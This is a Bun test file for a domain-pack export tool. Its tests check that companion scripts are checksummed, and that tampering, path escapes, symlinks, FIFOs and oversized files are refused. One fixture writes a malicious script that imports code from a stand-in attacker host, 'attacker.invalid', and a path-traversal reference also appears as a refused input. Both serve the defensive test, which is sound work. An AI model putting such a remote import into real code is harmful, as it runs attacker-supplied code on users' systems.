import {test,expect} from 'bun:test';
import {mkdtemp,cp,rm,readFile,symlink} from 'node:fs/promises';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {exportPack,snapshotPack} from '../../scripts/loaders/export';
import {hash} from '../../scripts/loaders/state';
const sample='spec/domain-packs/court-documents-loader-demo';
async function setup(fn:(root:string)=>Promise<void>){const root=await mkdtemp(join(tmpdir(),'umf-companion-export-'));try{await fn(root);}finally{await rm(root,{recursive:true,force:true});}}
test('trusted export snapshots bytes and clean CLI installs @covers US-060-AC12',async()=>setup(async root=>{
 const source=join(root,'source'),output=join(root,'export');await cp(sample,source,{recursive:true});
 const result=await exportPack(join(source,'pack.json'),output,{includeSources:true,afterSnapshot:async()=>{await Bun.write(join(source,'run.ts'),'throw Error("replacement must not execute")');}});
 expect(result.artifacts).toBe(7);
 expect(hash(new Uint8Array(await readFile(join(output,'run.ts'))))).toBe((await Bun.file(join(output,'domain-pack.json')).json()).loader.artifacts[0].sha256);
 const run=async(mode:string,inventory:boolean)=>{
  const p=Bun.spawn([process.execPath,join(output,'run.ts'),'--pack',join(output,'domain-pack.json'),'--state',join(root,'state'),'--mode',mode,'--rights','local-use',...(inventory?['--inventory',join(output,'inventory.json')]:[])],{cwd:tmpdir(),stdout:'pipe',stderr:'pipe'});
  const [code,stdout,stderr]=await Promise.all([p.exited,new Response(p.stdout).text(),new Response(p.stderr).text()]);return {code,stdout,stderr};
 };
 expect((await run('backfill',true)).code).toBe(0);const replay=await run('replay',false);expect(replay.code).toBe(0);expect(JSON.parse(replay.stdout).scope).toEqual([]);
}));
test('updated malicious checksum, missing closure and path collisions refuse @covers US-060-AC12',async()=>setup(async root=>{
 const source=join(root,'source');await cp(sample,source,{recursive:true});const path=join(source,'pack.json'),original=await Bun.file(path).json();
 const malicious='import "https://attacker.invalid/execute.js"; throw Error("must never execute")';
 await Bun.write(join(source,'run.ts'),malicious);const altered=structuredClone(original);altered.loader.artifacts[0].sha256=hash(malicious);await Bun.write(path,JSON.stringify(altered));
 await expect(snapshotPack(path)).rejects.toThrow('UNTRUSTED_COMPANION');
 await cp(join(sample,'run.ts'),join(source,'run.ts'));await Bun.write(path,JSON.stringify(original));
 await rm(join(source,'inventory.schema.json'));await expect(snapshotPack(path)).rejects.toThrow();
 await cp(join(sample,'inventory.schema.json'),join(source,'inventory.schema.json'));
 const collision={...original,schemas:[{id:'collision',format:'json',reference:'run.ts'}]};await Bun.write(path,JSON.stringify(collision));await expect(snapshotPack(path)).rejects.toThrow('Duplicate');
 await Bun.write(path,JSON.stringify({...original,schemas:[{id:'escape',format:'json',reference:'../outside.json'}]}));await expect(snapshotPack(path)).rejects.toThrow();
 await Bun.write(path,JSON.stringify(original));await rm(join(source,'run.ts'));await symlink(join(root,'outside.ts'),join(source,'run.ts'));await Bun.write(join(root,'outside.ts'),'outside');await expect(snapshotPack(path)).rejects.toThrow('COMPANION_PATH');
}));
test('SEC exported CLI uses operator agent and replays without environment @covers US-060-AC12',async()=>setup(async root=>{
 const output=join(root,'export');await exportPack('spec/domain-packs/sec-filings-loader-demo/pack.json',output,{includeSources:true});
 const invoke=async(mode:string,agent?:string)=>{const env={...process.env};delete env.UMF_LOADER_USER_AGENT;if(agent)env.UMF_LOADER_USER_AGENT=agent;const child=Bun.spawn([process.execPath,join(output,'run.ts'),'--pack',join(output,'domain-pack.json'),'--state',join(root,'state'),'--mode',mode,'--rights','local-use',...(mode==='replay'?[]:['--inventory',join(output,'inventory.json')])],{env,cwd:tmpdir(),stdout:'pipe',stderr:'pipe'});const [code,stdout,stderr]=await Promise.all([child.exited,new Response(child.stdout).text(),new Response(child.stderr).text()]);return {code,stdout,stderr};};
 expect((await invoke('backfill')).code).toBe(1);expect((await invoke('backfill','UMF fixture contact@example.org')).code).toBe(0);expect((await invoke('replay')).code).toBe(0);
}));
test('large artifacts refuse before unbounded export allocation @covers US-060-AC12',async()=>setup(async root=>{
 const source=join(root,'source');await cp(sample,source,{recursive:true});const path=join(source,'pack.json'),pack=await Bun.file(path).json();
 const file=join(source,'huge.json'),fd=await import('node:fs/promises').then(m=>m.open(file,'w'));await fd.truncate(11*1024*1024);await fd.close();
 pack.schemas=[{id:'huge',format:'json',reference:'huge.json'}];await Bun.write(path,JSON.stringify(pack));await expect(snapshotPack(path)).rejects.toThrow('FILE_BYTE_LIMIT');
}));

test('special files and oversized check destinations refuse promptly @covers US-060-AC12',async()=>setup(async root=>{
 const source=join(root,'source');await cp(sample,source,{recursive:true});const path=join(source,'pack.json'),pack=await Bun.file(path).json();
 const fifo=join(source,'fifo.json'),child=Bun.spawn(['mkfifo',fifo]);expect(await child.exited).toBe(0);
 await Bun.write(path,JSON.stringify({...pack,schemas:[{id:'fifo',format:'json',reference:'fifo.json'}]}));await expect(snapshotPack(path)).rejects.toThrow('FILE_BYTE_LIMIT');
 await Bun.write(path,JSON.stringify(pack));const output=join(root,'export');await exportPack(path,output);
 const fd=await import('node:fs/promises').then(m=>m.open(join(output,'run.ts'),'w'));await fd.truncate(20*1024*1024);await fd.close();await expect(exportPack(path,output,{check:true})).rejects.toThrow('Stale pack export');
}));
test('source annotations reuse only verified canonical companion bytes @covers US-060-AC12',async()=>setup(async root=>{
 const source=join(root,'source');await cp(sample,source,{recursive:true});const path=join(source,'pack.json'),pack=await Bun.file(path).json(),artifact=pack.loader.artifacts[0];
 pack.sources.companion={kind:'external',data_kind:'unknown',reference:artifact.reference,format:'text',checksum:{algorithm:'sha256',value:artifact.sha256},license:{redistribution:'allowed'},metadata:{meaning:'independent source annotation'}};
 await Bun.write(path,JSON.stringify(pack));const snapshot=await snapshotPack(path,true);expect(snapshot.entries.size).toBe(7);expect(snapshot.pack.sources.companion.metadata.meaning).toBe('independent source annotation');
 pack.sources.companion.checksum.value='0'.repeat(64);await Bun.write(path,JSON.stringify(pack));await expect(snapshotPack(path,true)).rejects.toThrow('Source checksum differs');
}));
